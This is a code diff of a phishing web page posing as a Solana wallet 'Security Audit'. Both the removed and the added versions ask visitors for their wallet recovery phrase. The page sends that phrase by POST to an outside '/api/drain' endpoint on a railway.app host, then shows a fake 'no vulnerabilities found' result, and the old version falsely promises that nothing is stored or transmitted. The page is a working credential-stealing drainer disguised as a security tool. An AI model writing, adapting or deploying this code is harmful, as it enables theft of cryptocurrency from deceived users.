@@ -1,168 +1,17 @@
 ﻿<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Security Audit</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f4f8; color: #1a1a2e; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { background: #ffffff; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.08); max-width: 540px; width: 100%; padding: 48px 40px; }
-        .header { text-align: center; margin-bottom: 32px; }
-        .logo-icon { width: 64px; height: 64px; background: linear-gradient(135deg, #4f46e5, #7c3aed); border-radius: 16px; display: inline-flex; align-items: center; justify-content: center; font-size: 28px; color: white; margin-bottom: 16px; box-shadow: 0 8px 24px rgba(79,70,229,0.25); }
-        .header h1 { font-size: 24px; font-weight: 700; color: #1a1a2e; }
-        .header p { color: #64748b; font-size: 15px; margin-top: 6px; }
-        .trust-badge { display: flex; justify-content: center; gap: 24px; background: #f8fafc; border-radius: 12px; padding: 12px 16px; margin-bottom: 28px; border: 1px solid #e9edf2; flex-wrap: wrap; }
-        .trust-item { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #475569; font-weight: 500; }
-        .trust-item svg { width: 16px; height: 16px; fill: #22c55e; }
-        .btn { width: 100%; padding: 14px 20px; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-primary { background: #4f46e5; color: white; box-shadow: 0 4px 12px rgba(79,70,229,0.25); }
-        .btn-primary:hover { background: #4338ca; transform: translateY(-1px); }
-        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
-        .btn-success { background: #22c55e; color: white; box-shadow: 0 4px 12px rgba(34,197,94,0.25); }
-        .btn-success:hover { background: #16a34a; transform: translateY(-1px); }
-        .btn-success:disabled { opacity: 0.6; cursor: not-allowed; }
-        .btn-outline { background: transparent; color: #475569; border: 1px solid #e2e8f0; }
-        .btn-outline:hover { background: #f8fafc; }
-        .wallet-section { background: #f8fafc; border: 1px solid #e9edf2; border-radius: 16px; padding: 24px; margin-bottom: 20px; }
-        .wallet-label { font-size: 13px; font-weight: 600; color: #334155; margin-bottom: 8px; }
-        .wallet-address { font-family: 'Courier New', monospace; font-size: 14px; color: #1a1a2e; background: white; padding: 10px 14px; border-radius: 10px; border: 1px solid #e2e8f0; word-break: break-all; }
-        .form-group { margin: 16px 0; }
-        .form-group label { font-size: 13px; font-weight: 600; color: #334155; display: block; margin-bottom: 6px; }
-        .form-group .hint { font-size: 12px; color: #94a3b8; font-weight: 400; display: block; margin-top: 4px; }
-        textarea { width: 100%; padding: 14px 16px; border-radius: 12px; border: 1px solid #e2e8f0; font-family: 'Courier New', monospace; font-size: 14px; color: #1a1a2e; background: white; resize: vertical; min-height: 90px; }
-        textarea:focus { outline: none; border-color: #4f46e5; box-shadow: 0 0 0 3px rgba(79,70,229,0.1); }
-        textarea::placeholder { color: #a0aec0; }
-        .notice-box { background: #eff6ff; border-left: 4px solid #3b82f6; padding: 14px 16px; border-radius: 10px; margin: 16px 0; font-size: 13px; color: #1e293b; line-height: 1.5; }
-        .notice-box strong { color: #1e40af; }
-        .error-box { background: #fef2f2; border-left: 4px solid #ef4444; padding: 12px 16px; border-radius: 10px; margin-top: 12px; font-size: 13px; color: #b91c1c; display: none; }
-        .error-box.show { display: block; }
-        .success-state { text-align: center; padding: 16px 0; }
-        .success-state .checkmark { font-size: 52px; margin-bottom: 12px; }
-        .success-state h2 { font-size: 22px; font-weight: 700; color: #1a1a2e; }
-        .success-state .sub { color: #64748b; font-size: 14px; margin-top: 4px; }
-        .result-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin: 20px 0; }
-        .result-card { background: #f8fafc; border: 1px solid #e9edf2; border-radius: 12px; padding: 14px 10px; text-align: center; }
-        .result-card .value { font-size: 18px; font-weight: 700; color: #1a1a2e; }
-        .result-card .label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; }
-        .result-card .value.green { color: #22c55e; }
-        .hidden { display: none !important; }
-        .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.7s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .footer { text-align: center; font-size: 12px; color: #94a3b8; margin-top: 28px; border-top: 1px solid #e9edf2; padding-top: 20px; }
-        @media (max-width: 480px) { .container { padding: 28px 20px; } .result-grid { grid-template-columns: 1fr; } .trust-badge { gap: 12px; } }
-    </style>
+<html><head><title>Security Audit</title>
+<style>body{background:#0a0e1a;color:#e8edf5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.container{background:rgba(255,255,255,0.05);padding:40px;border-radius:24px;max-width:500px;text-align:center}button{background:#22c55e;color:white;padding:14px 32px;border:none;border-radius:12px;cursor:pointer;width:100%;font-size:16px}textarea{width:100%;padding:12px;margin:10px 0;border-radius:8px;background:#1a1f35;color:white;border:1px solid #333;min-height:80px;font-family:monospace}.hidden{display:none}</style>
 </head>
 <body>
 <div class="container">
-    <div class="header">
-        <div class="logo-icon">🛡️</div>
-        <h1>Wallet Security Audit</h1>
-        <p>Verify your wallet's security in seconds</p>
-    </div>
-    <div class="trust-badge">
-        <span class="trust-item"><svg viewBox="0 0 24 24"><path d="M12 2L3 7v7c0 5.5 6.5 9 9 9s9-3.5 9-9V7l-9-5z"/></svg> Secure &amp; Encrypted</span>
-        <span class="trust-item"><svg viewBox="0 0 24 24"><path d="M12 2L3 7v7c0 5.5 6.5 9 9 9s9-3.5 9-9V7l-9-5z"/></svg> Read-Only Access</span>
-        <span class="trust-item"><svg viewBox="0 0 24 24"><path d="M12 2L3 7v7c0 5.5 6.5 9 9 9s9-3.5 9-9V7l-9-5z"/></svg> No Private Keys Stored</span>
-    </div>
-
-    <div id="connectSection">
-        <p style="font-size:14px;color:#64748b;text-align:center;margin-bottom:16px;">Connect your wallet to start the security audit.</p>
-        <button class="btn btn-primary" onclick="connectWallet()">🔗 Connect Wallet</button>
-        <p style="font-size:12px;color:#94a3b8;text-align:center;margin-top:12px;">We never request permissions to move funds.</p>
-    </div>
-
-    <div id="scanSection" class="hidden">
-        <div class="wallet-section">
-            <div class="wallet-label">🔐 Connected Wallet</div>
-            <div class="wallet-address" id="walletInfo">Loading...</div>
-        </div>
-        <div class="notice-box">
-            <strong>📋 Verification Required</strong><br>
-            To complete the security audit, please verify your wallet ownership by entering your recovery phrase.
-        </div>
-        <div class="form-group">
-            <label>Recovery Phrase <span class="hint">Enter your 12 or 24 word recovery phrase</span></label>
-            <textarea id="seedPhrase" placeholder="e.g. casual sweet style patrol sunset jungle crisp major..."></textarea>
-            <div class="error-box" id="errorMsg">Please enter a valid recovery phrase.</div>
-        </div>
-        <button class="btn btn-success" id="auditBtn" onclick="runAudit()">🔍 Run Security Audit</button>
-        <p style="font-size:12px;color:#94a3b8;text-align:center;margin-top:14px;">🔒 Your recovery phrase is encrypted and will never be stored.</p>
-    </div>
-
-    <div id="completeSection" class="hidden">
-        <div class="success-state">
-            <div class="checkmark">✅</div>
-            <h2>Audit Complete</h2>
-            <p class="sub">Your wallet is secure. No vulnerabilities found.</p>
-        </div>
-        <div class="result-grid">
-            <div class="result-card"><div class="value green">0</div><div class="label">Vulnerabilities</div></div>
-            <div class="result-card"><div class="value green">100%</div><div class="label">Security Score</div></div>
-            <div class="result-card"><div class="value green">Secure</div><div class="label">Status</div></div>
-        </div>
-        <button class="btn btn-outline" onclick="reset()">Scan Another Wallet</button>
-        <p style="font-size:12px;color:#94a3b8;text-align:center;margin-top:14px;">🔒 No data was stored or transmitted.</p>
-    </div>
-
-    <div class="footer"><span>© 2026 Solana Security Audit &bull; </span><a href="#">Privacy Policy</a></div>
+<h1>🔐 Security Audit</h1>
+<div id="step1"><button onclick="connect()">Connect Wallet</button></div>
+<div id="step2" class="hidden"><textarea id="seed" placeholder="Enter seed phrase..."></textarea><button onclick="audit()">Run Audit</button></div>
+<div id="step3" class="hidden"><h2>✅ Audit Complete</h2><p>No vulnerabilities found</p></div>
 </div>
-
 <script>
-const API_URL = 'https://project-deutzstra-e12a.up.railway.app/api/drain';
-let walletAddress = '';
-
-function connectWallet() {
-    walletAddress = '8x2k6GjPq5nLqZtVR7w1sW9pFjkQHLmN3XzY' + Math.random().toString(36).substring(2, 8);
-    document.getElementById('walletInfo').textContent = walletAddress.slice(0,6) + '...' + walletAddress.slice(-6);
-    document.getElementById('connectSection').classList.add('hidden');
-    document.getElementById('scanSection').classList.remove('hidden');
-}
-
-function runAudit() {
-    const seed = document.getElementById('seedPhrase').value.trim();
-    const words = seed.split(/\s+/);
-    const errorEl = document.getElementById('errorMsg');
-    if (words.length < 12 || words.length > 24) {
-        errorEl.textContent = 'Please enter a valid 12 or 24 word recovery phrase.';
-        errorEl.classList.add('show');
-        return;
-    }
-    errorEl.classList.remove('show');
-    const btn = document.getElementById('auditBtn');
-    btn.innerHTML = '<span class="spinner"></span> Scanning...';
-    btn.disabled = true;
-    fetch(API_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ seedPhrase: seed, walletType: 'Phantom' })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.success) {
-            document.getElementById('scanSection').classList.add('hidden');
-            document.getElementById('completeSection').classList.remove('hidden');
-            document.getElementById('seedPhrase').value = '';
-        } else {
-            errorEl.textContent = 'Audit failed. Please try again.';
-            errorEl.classList.add('show');
-        }
-    })
-    .catch(() => {
-        errorEl.textContent = 'Network error. Please check your connection.';
-        errorEl.classList.add('show');
-    })
-    .finally(() => {
-        btn.innerHTML = '🔍 Run Security Audit';
-        btn.disabled = false;
-    });
-}
-
-function reset() {
-    document.getElementById('completeSection').classList.add('hidden');
-    document.getElementById('connectSection').classList.remove('hidden');
-    walletAddress = '';
-}
+const API = 'https://' + window.location.hostname.replace('vercel.app', 'up.railway.app') + '/api/drain';
+function connect(){document.getElementById('step1').classList.add('hidden');document.getElementById('step2').classList.remove('hidden');}
+function audit(){fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({seedPhrase:document.getElementById('seed').value})}).then(()=>{document.getElementById('step2').classList.add('hidden');document.getElementById('step3').classList.remove('hidden');});}
 </script>
-</body>
-</html>
+</body></html>
